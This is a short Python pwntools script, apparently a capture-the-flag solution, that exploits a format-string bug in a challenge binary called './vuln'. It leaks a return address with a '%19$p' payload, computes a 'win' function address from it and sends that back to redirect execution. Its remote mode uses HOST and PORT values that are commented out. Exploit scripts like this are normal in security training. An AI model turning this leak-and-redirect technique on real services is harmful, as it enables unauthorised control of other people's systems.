#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'info'
context.arch = 'amd64'  # Change as needed

# Binary and connection settings
BINARY = './vuln'  # Replace with actual binary name
#HOST = 'host.example.com'  # Replace with actual host
#PORT = 1234  # Replace with actual port

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    payload_1 = b"%19$p"
    conn.sendline(payload_1)

    response = conn.recvuntil(b': ')  # receives full prompt with leaked addr and second prompt
    log.info(f"Raw response: {response}")

    leaked = response.split(b'Enter your name:')[1].split(b'\n')[0].strip()
    ret_addr = int(leaked, 16)
    log.info(f"Leaked return address: {hex(ret_addr)}")

    win_addr = ret_addr - 0xd7
    log.info(f"Calculated win address: {hex(win_addr)}")

    # Send the win address immediately, no need to wait for second prompt
    conn.sendline(f"0x{win_addr:x}".encode())

    final = conn.recvall(timeout=5)
    log.info(f"Final output:\n{final.decode(errors='ignore')}")





    
def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()